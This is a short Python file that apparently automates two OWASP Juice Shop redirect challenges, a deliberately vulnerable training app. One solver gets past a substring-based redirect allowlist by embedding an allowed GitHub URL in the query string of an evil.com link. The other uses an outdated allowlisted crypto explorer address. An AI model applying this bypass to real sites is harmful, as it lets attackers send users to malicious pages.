from core.base_solver import BaseSolver
import urllib.parse

class RedirectSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "redirectChallenge"

    def solve(self) -> bool:
        # Bypass allowlist using 'includes' vulnerability
        target = "http://evil.com?https://github.com/juice-shop/juice-shop"
        res = self.client.get(f"/redirect?to={urllib.parse.quote(target)}")
        return res.status_code in [302, 301]

class RedirectCryptoSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "redirectCryptoCurrencyChallenge"

    def solve(self) -> bool:
        # Redirect to an outdated allowlist entry (Dash explorer)
        target = "https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW"
        res = self.client.get(f"/redirect?to={urllib.parse.quote(target)}")
        return res.status_code in [302, 301]
